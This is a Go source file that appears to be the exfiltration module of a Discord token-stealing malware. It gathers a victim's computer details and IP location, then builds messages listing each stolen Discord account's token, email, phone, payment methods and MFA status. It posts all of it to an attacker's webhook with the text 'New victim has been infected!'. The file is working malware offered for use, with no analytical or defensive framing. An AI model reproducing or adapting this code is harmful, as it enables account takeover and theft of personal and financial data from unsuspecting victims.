package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

const DiscordWebhookUrl = ""

type DiscordMessage struct {
	Content string         `json:"content"`
	Embeds  []DiscordEmbed `json:"embeds,omitempty"`
}

type DiscordEmbed struct {
	Title       string                 `json:"title,omitempty"`
	Description string                 `json:"description,omitempty"`
	Fields      []DiscordEmbedField    `json:"fields,omitempty"`
	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
}

type DiscordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type DiscordEmbedFooter struct {
	Text string `json:"text"`
}

type DiscordEmbedThumbnail struct {
	URL string `json:"url"`
}

func SendDiscordNotification() error {
	computerInfo := []string{
		fmt.Sprintf("**Computer Name:** `%s`", GetComputerName()),
		fmt.Sprintf("💾 **RAM:** %d MB", GetRAMUsage()),
		fmt.Sprintf("**CPU:** %s", GetCpuName()),
		fmt.Sprintf("**OS:** %s", GetFullOSName()),
	}
	ipInfo, err := GetIPInfo()
	if err != nil {
		panic(err)
	}

	embeds := []DiscordEmbed{
		{
			Title: "Victim Info",
			Fields: []DiscordEmbedField{
				{
					Name:   "💻 Computer Info",
					Value:  strings.Join(computerInfo, "\n"),
					Inline: true,
				},
				{
					Name: "📍 IP Info",
					Value: fmt.Sprintf(
						"**IP:** `%s`\n📍 **Location:** %s, %s, %s :flag_%s:\n**ISP:** `%s`",
						ipInfo.IP, ipInfo.City, ipInfo.Region, ipInfo.Country, strings.ToLower(ipInfo.Country), ipInfo.Org,
					),
					Inline: true,
				},
			},
		},
	}

	for _, account := range discordAccountResults {
		badges := "None"
		if len(account.Badges) > 0 {
			badges = strings.Join(account.Badges, ", ")
		}
		nitro := "None"
		if account.NitroType == 1 {
			nitro = "Nitro Classic"
		} else if account.NitroType == 2 {
			nitro = "Nitro"
		} else if account.NitroType == 3 {
			nitro = "Nitro Basic"
		}
		paymentMethods := "None"
		if account.HasPaymentMethods && len(account.PaymentMethods) > 0 {
			paymentMethods = strings.Join(account.PaymentMethods, ", ")
		}
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Discord Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 User ID",
					Value:  fmt.Sprintf("`%s`", account.ID),
					Inline: true,
				},
				{
					Name:   "👤 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name:   "🏷️ Badges",
					Value:  badges,
					Inline: true,
				},
				{
					Name:   "💳 Payment Methods",
					Value:  paymentMethods,
					Inline: true,
				},
				{
					Name:   "✨ Nitro",
					Value:  nitro,
					Inline: true,
				},
				{
					Name:   "🔐 MFA Enabled",
					Value:  humanizeBoolean(account.HasMFA),
					Inline: true,
				},
				{
					Name: "📱 Phone",
					Value: fmt.Sprintf("`%s`", func() string {
						if account.Phone != nil {
							return *account.Phone
						}
						return "None"
					}()),
					Inline: true,
				},
				{
					Name:   "📧 Email",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "🔒 Token",
					Value:  fmt.Sprintf("```\n%s\n```", account.Token),
					Inline: false,
				},
			},
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			Footer: &DiscordEmbedFooter{
				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
			},
		})
	}

	message := DiscordMessage{
		Content: "New victim has been infected!",
		Embeds:  embeds,
	}
	payload, _ := json.Marshal(message)
	res, err := http.Post(DiscordWebhookUrl, "application/json", strings.NewReader(string(payload)))
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode != http.StatusNoContent {
		return fmt.Errorf("failed to send Discord notification, status code: %d", res.StatusCode)
	}
	return nil
}
